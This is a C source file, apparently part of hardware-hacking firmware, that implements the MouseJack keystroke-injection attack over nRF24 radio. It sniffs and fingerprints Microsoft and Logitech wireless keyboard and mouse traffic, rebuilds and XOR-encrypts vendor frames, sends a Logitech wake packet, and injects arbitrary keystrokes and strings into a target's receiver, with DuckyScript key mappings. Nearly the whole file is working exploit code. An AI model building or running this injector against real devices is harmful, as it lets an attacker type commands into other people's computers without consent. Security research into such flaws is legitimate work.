#include "nrf24_mj_core.h"
#include "../nrf24_hw.h"

#include <furi.h>
#include <esp_rom_sys.h>
#include <string.h>
#include <strings.h>

#define TAG "Nrf24Mj"

#define MJ_ATTACK_RETRANSMITS 5
#define MJ_ATTACK_INTER_KEY_MS 10

/* ---- ASCII -> HID lookup table (ported 1:1 from Bruce nrf_mousejack.cpp) ---- */
static const MjHidKey ASCII_TO_HID[] = {
    {MJ_MOD_NONE,   MJ_KEY_SPACE    }, /* 0x20 SPACE */
    {MJ_MOD_LSHIFT, MJ_KEY_1        }, /* 0x21 ! */
    {MJ_MOD_LSHIFT, MJ_KEY_QUOTE    }, /* 0x22 " */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 2    }, /* 0x23 # = SHIFT+3 */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 3    }, /* 0x24 $ = SHIFT+4 */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 4    }, /* 0x25 % = SHIFT+5 */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 6    }, /* 0x26 & = SHIFT+7 */
    {MJ_MOD_NONE,   MJ_KEY_QUOTE    }, /* 0x27 ' */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 8    }, /* 0x28 ( = SHIFT+9 */
    {MJ_MOD_LSHIFT, 0x27            }, /* 0x29 ) = SHIFT+0 */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 7    }, /* 0x2A * = SHIFT+8 */
    {MJ_MOD_LSHIFT, MJ_KEY_EQUAL    }, /* 0x2B + */
    {MJ_MOD_NONE,   MJ_KEY_COMMA    }, /* 0x2C , */
    {MJ_MOD_NONE,   MJ_KEY_MINUS    }, /* 0x2D - */
    {MJ_MOD_NONE,   MJ_KEY_DOT      }, /* 0x2E . */
    {MJ_MOD_NONE,   MJ_KEY_SLASH    }, /* 0x2F / */
    {MJ_MOD_NONE,   0x27            }, /* 0x30 0 */
    {MJ_MOD_NONE,   MJ_KEY_1        }, /* 0x31 1 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 1    }, /* 0x32 2 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 2    }, /* 0x33 3 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 3    }, /* 0x34 4 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 4    }, /* 0x35 5 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 5    }, /* 0x36 6 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 6    }, /* 0x37 7 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 7    }, /* 0x38 8 */
    {MJ_MOD_NONE,   MJ_KEY_1 + 8    }, /* 0x39 9 */
    {MJ_MOD_LSHIFT, MJ_KEY_SEMICOLON}, /* 0x3A : */
    {MJ_MOD_NONE,   MJ_KEY_SEMICOLON}, /* 0x3B ; */
    {MJ_MOD_LSHIFT, MJ_KEY_COMMA    }, /* 0x3C < */
    {MJ_MOD_NONE,   MJ_KEY_EQUAL    }, /* 0x3D = */
    {MJ_MOD_LSHIFT, MJ_KEY_DOT      }, /* 0x3E > */
    {MJ_MOD_LSHIFT, MJ_KEY_SLASH    }, /* 0x3F ? */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 1    }, /* 0x40 @ = SHIFT+2 */
    {MJ_MOD_LSHIFT, MJ_KEY_A        }, /* 0x41 A */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 1    }, /* 0x42 B */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 2    }, /* 0x43 C */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 3    }, /* 0x44 D */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 4    }, /* 0x45 E */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 5    }, /* 0x46 F */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 6    }, /* 0x47 G */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 7    }, /* 0x48 H */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 8    }, /* 0x49 I */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 9    }, /* 0x4A J */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 10   }, /* 0x4B K */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 11   }, /* 0x4C L */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 12   }, /* 0x4D M */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 13   }, /* 0x4E N */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 14   }, /* 0x4F O */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 15   }, /* 0x50 P */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 16   }, /* 0x51 Q */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 17   }, /* 0x52 R */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 18   }, /* 0x53 S */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 19   }, /* 0x54 T */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 20   }, /* 0x55 U */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 21   }, /* 0x56 V */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 22   }, /* 0x57 W */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 23   }, /* 0x58 X */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 24   }, /* 0x59 Y */
    {MJ_MOD_LSHIFT, MJ_KEY_A + 25   }, /* 0x5A Z */
    {MJ_MOD_NONE,   MJ_KEY_LBRACKET }, /* 0x5B [ */
    {MJ_MOD_NONE,   MJ_KEY_BACKSLASH}, /* 0x5C \ */
    {MJ_MOD_NONE,   MJ_KEY_RBRACKET }, /* 0x5D ] */
    {MJ_MOD_LSHIFT, MJ_KEY_1 + 5    }, /* 0x5E ^ = SHIFT+6 */
    {MJ_MOD_LSHIFT, MJ_KEY_MINUS    }, /* 0x5F _ */
    {MJ_MOD_NONE,   MJ_KEY_GRAVE    }, /* 0x60 ` */
    {MJ_MOD_NONE,   MJ_KEY_A        }, /* 0x61 a */
    {MJ_MOD_NONE,   MJ_KEY_A + 1    }, /* 0x62 b */
    {MJ_MOD_NONE,   MJ_KEY_A + 2    }, /* 0x63 c */
    {MJ_MOD_NONE,   MJ_KEY_A + 3    }, /* 0x64 d */
    {MJ_MOD_NONE,   MJ_KEY_A + 4    }, /* 0x65 e */
    {MJ_MOD_NONE,   MJ_KEY_A + 5    }, /* 0x66 f */
    {MJ_MOD_NONE,   MJ_KEY_A + 6    }, /* 0x67 g */
    {MJ_MOD_NONE,   MJ_KEY_A + 7    }, /* 0x68 h */
    {MJ_MOD_NONE,   MJ_KEY_A + 8    }, /* 0x69 i */
    {MJ_MOD_NONE,   MJ_KEY_A + 9    }, /* 0x6A j */
    {MJ_MOD_NONE,   MJ_KEY_A + 10   }, /* 0x6B k */
    {MJ_MOD_NONE,   MJ_KEY_A + 11   }, /* 0x6C l */
    {MJ_MOD_NONE,   MJ_KEY_A + 12   }, /* 0x6D m */
    {MJ_MOD_NONE,   MJ_KEY_A + 13   }, /* 0x6E n */
    {MJ_MOD_NONE,   MJ_KEY_A + 14   }, /* 0x6F o */
    {MJ_MOD_NONE,   MJ_KEY_A + 15   }, /* 0x70 p */
    {MJ_MOD_NONE,   MJ_KEY_A + 16   }, /* 0x71 q */
    {MJ_MOD_NONE,   MJ_KEY_A + 17   }, /* 0x72 r */
    {MJ_MOD_NONE,   MJ_KEY_A + 18   }, /* 0x73 s */
    {MJ_MOD_NONE,   MJ_KEY_A + 19   }, /* 0x74 t */
    {MJ_MOD_NONE,   MJ_KEY_A + 20   }, /* 0x75 u */
    {MJ_MOD_NONE,   MJ_KEY_A + 21   }, /* 0x76 v */
    {MJ_MOD_NONE,   MJ_KEY_A + 22   }, /* 0x77 w */
    {MJ_MOD_NONE,   MJ_KEY_A + 23   }, /* 0x78 x */
    {MJ_MOD_NONE,   MJ_KEY_A + 24   }, /* 0x79 y */
    {MJ_MOD_NONE,   MJ_KEY_A + 25   }, /* 0x7A z */
    {MJ_MOD_LSHIFT, MJ_KEY_LBRACKET }, /* 0x7B { */
    {MJ_MOD_LSHIFT, MJ_KEY_BACKSLASH}, /* 0x7C | */
    {MJ_MOD_LSHIFT, MJ_KEY_RBRACKET }, /* 0x7D } */
    {MJ_MOD_LSHIFT, MJ_KEY_GRAVE    }, /* 0x7E ~ */
};

bool mj_ascii_to_hid(char c, MjHidKey* out) {
    if(c < 0x20 || c > 0x7E) return false;
    *out = ASCII_TO_HID[(uint8_t)c - 0x20];
    return out->keycode != MJ_KEY_NONE;
}

/* ---- DuckyScript key-name table ---- */
typedef struct {
    const char* name;
    uint8_t modifier;
    uint8_t keycode;
} MjDuckyName;

static const MjDuckyName DUCKY_KEYS[] = {
    {"ENTER",       MJ_MOD_NONE,   MJ_KEY_ENTER     },
    {"RETURN",      MJ_MOD_NONE,   MJ_KEY_ENTER     },
    {"ESCAPE",      MJ_MOD_NONE,   MJ_KEY_ESC       },
    {"ESC",         MJ_MOD_NONE,   MJ_KEY_ESC       },
    {"BACKSPACE",   MJ_MOD_NONE,   MJ_KEY_BACKSPACE },
    {"TAB",         MJ_MOD_NONE,   MJ_KEY_TAB       },
    {"SPACE",       MJ_MOD_NONE,   MJ_KEY_SPACE     },
    {"CAPSLOCK",    MJ_MOD_NONE,   MJ_KEY_CAPSLOCK  },
    {"DELETE",      MJ_MOD_NONE,   MJ_KEY_DELETE    },
    {"DEL",         MJ_MOD_NONE,   MJ_KEY_DELETE    },
    {"INSERT",      MJ_MOD_NONE,   MJ_KEY_INSERT    },
    {"HOME",        MJ_MOD_NONE,   MJ_KEY_HOME      },
    {"END",         MJ_MOD_NONE,   MJ_KEY_END       },
    {"PAGEUP",      MJ_MOD_NONE,   MJ_KEY_PAGEUP    },
    {"PAGEDOWN",    MJ_MOD_NONE,   MJ_KEY_PAGEDOWN  },
    {"UP",          MJ_MOD_NONE,   MJ_KEY_UP        },
    {"UPARROW",     MJ_MOD_NONE,   MJ_KEY_UP        },
    {"DOWN",        MJ_MOD_NONE,   MJ_KEY_DOWN      },
    {"DOWNARROW",   MJ_MOD_NONE,   MJ_KEY_DOWN      },
    {"LEFT",        MJ_MOD_NONE,   MJ_KEY_LEFT      },
    {"LEFTARROW",   MJ_MOD_NONE,   MJ_KEY_LEFT      },
    {"RIGHT",       MJ_MOD_NONE,   MJ_KEY_RIGHT     },
    {"RIGHTARROW",  MJ_MOD_NONE,   MJ_KEY_RIGHT     },
    {"PRINTSCREEN", MJ_MOD_NONE,   MJ_KEY_PRINTSCR  },
    {"SCROLLLOCK",  MJ_MOD_NONE,   MJ_KEY_SCROLLLOCK},
    {"PAUSE",       MJ_MOD_NONE,   MJ_KEY_PAUSE     },
    {"BREAK",       MJ_MOD_NONE,   MJ_KEY_PAUSE     },
    {"F1",          MJ_MOD_NONE,   MJ_KEY_F1        },
    {"F2",          MJ_MOD_NONE,   MJ_KEY_F1 + 1    },
    {"F3",          MJ_MOD_NONE,   MJ_KEY_F1 + 2    },
    {"F4",          MJ_MOD_NONE,   MJ_KEY_F1 + 3    },
    {"F5",          MJ_MOD_NONE,   MJ_KEY_F1 + 4    },
    {"F6",          MJ_MOD_NONE,   MJ_KEY_F1 + 5    },
    {"F7",          MJ_MOD_NONE,   MJ_KEY_F1 + 6    },
    {"F8",          MJ_MOD_NONE,   MJ_KEY_F1 + 7    },
    {"F9",          MJ_MOD_NONE,   MJ_KEY_F1 + 8    },
    {"F10",         MJ_MOD_NONE,   MJ_KEY_F1 + 9    },
    {"F11",         MJ_MOD_NONE,   MJ_KEY_F1 + 10   },
    {"F12",         MJ_MOD_NONE,   MJ_KEY_F12       },
    {"CTRL",        MJ_MOD_LCTRL,  MJ_KEY_NONE      },
    {"CONTROL",     MJ_MOD_LCTRL,  MJ_KEY_NONE      },
    {"SHIFT",       MJ_MOD_LSHIFT, MJ_KEY_NONE      },
    {"ALT",         MJ_MOD_LALT,   MJ_KEY_NONE      },
    {"GUI",         MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"WINDOWS",     MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"COMMAND",     MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"MENU",        MJ_MOD_NONE,   0x65             },
    {"APP",         MJ_MOD_NONE,   0x65             },
    {NULL,          0,             0                },
};

bool mj_lookup_ducky_key(const char* name, uint8_t* modifier, uint8_t* keycode) {
    for(size_t i = 0; DUCKY_KEYS[i].name != NULL; i++) {
        if(strcasecmp(name, DUCKY_KEYS[i].name) == 0) {
            *modifier = DUCKY_KEYS[i].modifier;
            *keycode = DUCKY_KEYS[i].keycode;
            return true;
        }
    }
    return false;
}

/* ---- CRC16-CCITT for ESB packet validation ---- */
static uint16_t mj_crc_update(uint16_t crc, uint8_t byte, uint8_t bits) {
    crc = crc ^ ((uint16_t)byte << 8);
    while(bits--) {
        if((crc & 0x8000) == 0x8000) {
            crc = (crc << 1) ^ 0x1021;
        } else {
            crc = crc << 1;
        }
    }
    return crc & 0xFFFF;
}

/* ---- Target list helpers (private) ---- */
static int mj_find_target(
    const MjTarget* targets,
    uint8_t count,
    const uint8_t* addr,
    uint8_t addr_len) {
    for(uint8_t i = 0; i < count; i++) {
        if(targets[i].addr_len == addr_len && memcmp(targets[i].address, addr, addr_len) == 0) {
            return i;
        }
    }
    return -1;
}

static int mj_add_target(
    MjTarget* targets,
    uint8_t* count,
    const uint8_t* addr,
    uint8_t addr_len,
    uint8_t channel,
    MjVendor vendor) {
    int idx = mj_find_target(targets, *count, addr, addr_len);
    if(idx >= 0) {
        targets[idx].channel = channel;
        targets[idx].hits++;
        return idx;
    }
    if(*count >= MJ_MAX_TARGETS) return -1;
    idx = (*count)++;
    memset(&targets[idx], 0, sizeof(MjTarget));
    memcpy(targets[idx].address, addr, addr_len);
    targets[idx].addr_len = addr_len;
    targets[idx].channel = channel;
    targets[idx].vendor = vendor;
    targets[idx].hits = 1;
    return idx;
}

/* ---- Fingerprint ESB payload ---- */
static int mj_fingerprint_payload(
    const uint8_t* payload,
    uint8_t size,
    const uint8_t* addr,
    uint8_t channel,
    MjTarget* targets,
    uint8_t* count) {
    /* Microsoft Mouse / Keyboard:
     *   size==19 && payload[0]==0x08 && payload[6]==0x40 → unencrypted MS
     *   size==19 && payload[0]==0x0A                     → encrypted MS */
    if(size == 19) {
        if(payload[0] == 0x08 && payload[6] == 0x40) {
            return mj_add_target(targets, count, addr, 5, channel, MjVendorMicrosoft);
        }
        if(payload[0] == 0x0A) {
            return mj_add_target(targets, count, addr, 5, channel, MjVendorMsCrypt);
        }
    }

    /* Logitech Unifying:
     *   size==10 && payload[1]==0xC2/0x4F  (keepalive / mouse movement)
     *   size==22 && payload[1]==0xD3       (encrypted keystroke)
     *   size== 5 && payload[1]==0x40       (wake-up) */
    if(payload[0] == 0x00) {
        bool is_logi = false;
        if(size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F)) is_logi = true;
        if(size == 22 && payload[1] == 0xD3) is_logi = true;
        if(size == 5 && payload[1] == 0x40) is_logi = true;
        if(is_logi) {
            return mj_add_target(targets, count, addr, 5, channel, MjVendorLogitech);
        }
    }

    return -1;
}

int mj_fingerprint(
    const uint8_t* raw_buf,
    uint8_t size,
    uint8_t channel,
    MjTarget* targets,
    uint8_t* target_count) {
    if(size < 10) return -1;
    if(size > 37) size = 37;

    uint8_t buf[37];
    /* Try both 0xAA and 0x55 preamble alignments by 1-bit right-shifting once. */
    for(int offset = 0; offset < 2; offset++) {
        memcpy(buf, raw_buf, size);
        if(offset == 1) {
            for(int x = size - 1; x >= 0; x--) {
                if(x > 0) {
                    buf[x] = (uint8_t)((buf[x - 1] << 7) | (buf[x] >> 1));
                } else {
                    buf[x] = (uint8_t)(buf[x] >> 1);
                }
            }
        }

        uint8_t payload_length = buf[5] >> 2;
        if(payload_length == 0 || payload_length > (size - 9)) continue;

        uint16_t crc_given = ((uint16_t)buf[6 + payload_length] << 9) |
                             ((uint16_t)buf[7 + payload_length] << 1);
        crc_given = (uint16_t)((crc_given << 8) | (crc_given >> 8));
        if(buf[8 + payload_length] & 0x80) crc_given |= 0x0100;

        uint16_t crc_calc = 0xFFFF;
        for(int x = 0; x < 6 + payload_length; x++) {
            crc_calc = mj_crc_update(crc_calc, buf[x], 8);
        }
        crc_calc = mj_crc_update(crc_calc, buf[6 + payload_length] & 0x80, 1);
        crc_calc = (uint16_t)((crc_calc << 8) | (crc_calc >> 8));

        if(crc_calc != crc_given) continue;

        uint8_t addr[5];
        memcpy(addr, buf, 5);

        uint8_t esb_payload[32];
        for(int x = 0; x < payload_length; x++) {
            esb_payload[x] = (uint8_t)(((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7));
        }

        return mj_fingerprint_payload(
            esb_payload, payload_length, addr, channel, targets, target_count);
    }
    return -1;
}

/* ---- Microsoft frame helpers ---- */
static void mj_ms_checksum(uint8_t* payload, uint8_t size) {
    uint8_t cs = 0;
    for(uint8_t i = 0; i < size - 1; i++) cs ^= payload[i];
    payload[size - 1] = (uint8_t)~cs;
}

static void mj_ms_crypt(uint8_t* payload, uint8_t size, const uint8_t* addr) {
    for(uint8_t i = 4; i < size; i++) {
        payload[i] ^= addr[(i - 4) % 5];
    }
}

/* Module-global Microsoft sequence counter — tied to a single attack run. */
static uint16_t g_ms_sequence = 0;

void mj_reset_ms_sequence(void) {
    g_ms_sequence = 0;
}

/* ---- Setup ---- */
void mj_setup_tx_for_target(const MjTarget* target) {
    uint8_t payload_len = (target->vendor == MjVendorMicrosoft || target->vendor == MjVendorMsCrypt)
                              ? 19
                              : 10;
    nrf24_hw_tx_setup(target->address, target->addr_len, target->channel, payload_len);
}

/* ---- Transmit primitives ---- */
static void mj_transmit_reliable(const uint8_t* frame, uint8_t len) {
    for(int r = 0; r < MJ_ATTACK_RETRANSMITS; r++) {
        nrf24_hw_tx_send(frame, len);
    }
}

static bool mj_log_transmit(
    const MjTarget* target,
    uint8_t meta,
    const uint8_t* keys,
    uint8_t keys_len) {
    uint8_t frame[10];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x00;
    frame[1] = 0xC1;
    frame[2] = meta;
    for(uint8_t i = 0; i < keys_len && i < 6; i++) {
        frame[3 + i] = keys[i];
    }
    /* Two's-complement checksum */
    uint8_t cs = 0;
    for(uint8_t i = 0; i < 9; i++) cs += frame[i];
    frame[9] = (uint8_t)(0x100 - cs);

    UNUSED(target);
    mj_transmit_reliable(frame, sizeof(frame));
    return true;
}

static bool mj_ms_transmit(const MjTarget* target, uint8_t meta, uint8_t hid) {
    uint8_t frame[19];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x08;
    frame[4] = (uint8_t)(g_ms_sequence & 0xFF);
    frame[5] = (uint8_t)((g_ms_sequence >> 8) & 0xFF);
    frame[6] = 0x43;
    frame[7] = meta;
    frame[9] = hid;
    g_ms_sequence++;

    mj_ms_checksum(frame, sizeof(frame));
    if(target->vendor == MjVendorMsCrypt) mj_ms_crypt(frame, sizeof(frame), target->address);

    /* Key-down */
    mj_transmit_reliable(frame, sizeof(frame));
    furi_delay_ms(5);

    /* Key-up: rebuild a null frame (decrypt first if encrypted, then re-encrypt). */
    if(target->vendor == MjVendorMsCrypt) mj_ms_crypt(frame, sizeof(frame), target->address);
    for(int n = 4; n < 18; n++) frame[n] = 0;
    frame[4] = (uint8_t)(g_ms_sequence & 0xFF);
    frame[5] = (uint8_t)((g_ms_sequence >> 8) & 0xFF);
    frame[6] = 0x43;
    g_ms_sequence++;
    mj_ms_checksum(frame, sizeof(frame));
    if(target->vendor == MjVendorMsCrypt) mj_ms_crypt(frame, sizeof(frame), target->address);

    mj_transmit_reliable(frame, sizeof(frame));
    furi_delay_ms(5);
    return true;
}

void mj_logitech_wake(const MjTarget* target) {
    if(target->vendor != MjVendorLogitech) return;

    /* Common wake/sleep-timer packet seen in MouseJack tooling. */
    uint8_t hello[10] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
    mj_transmit_reliable(hello, sizeof(hello));
    furi_delay_ms(12);

    uint8_t neutral = MJ_KEY_NONE;
    mj_log_transmit(target, MJ_MOD_NONE, &neutral, 1);
    furi_delay_ms(8);
}

bool mj_inject_keystroke(const MjTarget* target, uint8_t modifier, uint8_t keycode) {
    if(target->vendor == MjVendorMicrosoft || target->vendor == MjVendorMsCrypt) {
        return mj_ms_transmit(target, modifier, keycode);
    } else if(target->vendor == MjVendorLogitech) {
        bool ok = mj_log_transmit(target, modifier, &keycode, 1);
        furi_delay_ms(MJ_ATTACK_INTER_KEY_MS);
        uint8_t none = MJ_KEY_NONE;
        mj_log_transmit(target, MJ_MOD_NONE, &none, 1);
        return ok;
    }
    return false;
}

void mj_inject_string(const MjTarget* target, const char* text, volatile bool* abort) {
    for(size_t i = 0; text[i] != '\0'; i++) {
        if(abort && *abort) return;

        MjHidKey entry;
        char c = text[i];
        if(c == '\n') {
            entry.modifier = MJ_MOD_NONE;
            entry.keycode = MJ_KEY_ENTER;
        } else if(c == '\t') {
            entry.modifier = MJ_MOD_NONE;
            entry.keycode = MJ_KEY_TAB;
        } else if(!mj_ascii_to_hid(c, &entry)) {
            continue;
        }
        mj_inject_keystroke(target, entry.modifier, entry.keycode);
        furi_delay_ms(MJ_ATTACK_INTER_KEY_MS);
    }
}

const char* mj_vendor_label(MjVendor v) {
    switch(v) {
    case MjVendorMicrosoft: return "MS";
    case MjVendorMsCrypt: return "MS*";
    case MjVendorLogitech: return "LG";
    default: return "??";
    }
}

void mj_format_target(const MjTarget* t, char* buf, size_t cap) {
    if(cap == 0) return;
    /* Compact: last 3 bytes of address (most readable) + vendor + channel.
     * Fits in 24 chars, e.g. "AB:CD:EF (LG) ch72". */
    if(t->addr_len >= 3) {
        snprintf(
            buf,
            cap,
            "%02X:%02X:%02X (%s) ch%u",
            t->address[t->addr_len - 3],
            t->address[t->addr_len - 2],
            t->address[t->addr_len - 1],
            mj_vendor_label(t->vendor),
            t->channel);
    } else {
        snprintf(buf, cap, "(short addr) (%s)", mj_vendor_label(t->vendor));
    }
}
